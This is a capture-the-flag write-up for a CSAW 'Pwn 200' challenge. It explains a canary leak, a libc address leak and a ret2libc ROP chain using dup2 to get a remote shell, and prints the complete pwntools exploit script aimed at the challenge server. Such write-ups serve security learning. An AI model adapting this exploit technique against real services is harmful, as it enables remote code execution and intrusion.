# Pwn 200 - Tutorial

> Writeup by f0xtr0t (Jay Bosamiya)

This was a pretty fun challenge, solved by uchiha (Pankaj Kataria) and myself (f0xtr0t) during the contest.

Executing the [given executable](tutorial) with a numeric parameter sets up a server that listens on that TCP port, with the privileges of the user `tutorial`. I edited the fixed string to `jay` which is my user on my system, to make the [modified file](tutorial_mod), which is identical to the given file in all other respects.

Thereafter, we realized that there was a memory leak (in option `2`), which reveals the stack canary which is constant accross runs. Option `1` reveals a pointer with which we can compute libc base address.

Using these two, we realized that we would be able to do a `system('/bin/sh')` using a ret2libc. We wrote up quick code to be able to do this, and it seemed to work on our system, but not on the challenge server (though we were accounting for the libc difference).

After a while, we realized that though it was "working" on our system, the shell was being dropped on the server process, and not connected to the client. Doh! We needed to do a `dup2` to redirect stdin and stdout accross the network.

Some quick reversing told us that the file descriptor would be constant accross runs, and will also be a small number constant. We thus tried different values for that fd, until 4 worked, and we had a shell. :)

## [Exploit code](expl.py)

    from pwn import *
    
    local = False
    
    context(os = 'linux',
            arch = 'amd64',
            log_level = 'debug')
    
    bin=ELF('./tutorial_mod')
    
    if local:
        libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        libc=ELF('./libc-2.19.so')
    
    sysOffset = libc.symbols['system']
    putsOffset = libc.symbols['puts']
    
    if local:
        import sys
        conn = remote('localhost', sys.argv[1])
    else:
        conn = remote('pwn.chal.csaw.io', 8002)
    
    conn.recvuntil('>')
    conn.sendline('1')
    putsAddr = int(conn.recvuntil('>').split()[0].split(':')[1],16)
    libcBaseAddr = putsAddr + 1280 - putsOffset
    
    sysAddr = libcBaseAddr+sysOffset
    binShAddr = libcBaseAddr+libc.offset_to_vaddr(list(libc.search('/bin/sh'))[0])
    
    conn.sendline('2')
    conn.recvuntil('>')
    conn.sendline('temp')
    payload = conn.recvuntil('>')[:-39]
    
    rop = ROP(bin)
    
    payload += 'aaaa'
    
    their_fd = 4
    
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(their_fd)
    rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
    rop.raw(0)
    rop.raw(0xdeadbeef)
    rop.raw(libc.symbols['dup2'] + libcBaseAddr)
    
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(their_fd)
    rop.raw(rop.find_gadget(['pop rsi', 'pop r15', 'ret']).address)
    rop.raw(1)
    rop.raw(0xdeadbeef)
    rop.raw(libc.symbols['dup2'] + libcBaseAddr)
    
    rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
    rop.raw(binShAddr)
    rop.raw(sysAddr)
    payload += rop.chain()
    
    conn.sendline('2')
    conn.recvuntil('>')
    conn.sendline(payload)
    
    conn.interactive()
    conn.close()